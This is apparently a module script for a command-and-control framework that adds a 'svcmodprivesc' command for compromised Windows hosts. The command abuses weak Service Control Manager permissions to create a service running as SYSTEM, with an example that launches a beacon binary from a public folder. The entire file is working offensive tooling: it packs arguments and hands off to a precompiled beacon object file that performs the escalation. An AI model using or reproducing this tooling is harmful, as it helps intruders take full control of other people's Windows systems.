var metadata = {
    name: "SvcModPrivesc",
    description: "Exploit weak SCManager permissions to create a SYSTEM service"
};

/// COMMANDS

var cmd_svcprivesc = ax.create_command("svcmodprivesc", "Exploit weak SCManager permissions to create a SYSTEM service", "svcmodprivesc -svcname PwnService -path C:\\Users\\Public\\beacon.exe");

// Using Flag Arguments to parse '-svcname' and '-path'
cmd_svcprivesc.addArgFlagString("-svcname", "svcname", "Service name to create", "");
cmd_svcprivesc.addArgFlagString("-path", "path", "Binary path to execute", "");

cmd_svcprivesc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let svcname = parsed_json["svcname"];
    let path    = parsed_json["path"];

    // Debug output to console (using print instead of task_output)
    if (!svcname || !path) {
        print("[-] Error: -svcname and -path are required.");
        return;
    }

    // Pack as wide strings (wstr)
    let bof_params = ax.bof_pack("wstr,wstr", [svcname, path]);
    let bof_path = ax.script_dir() + "_bin/svcmodprivesc." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: LPE via Weak SCManager");
});

// Register the command group
var group = ax.create_commands_group("SvcModPrivesc", [cmd_svcprivesc]);
ax.register_commands_group(group, ["beacon", "gopher", "kharon"], ["windows"], []);
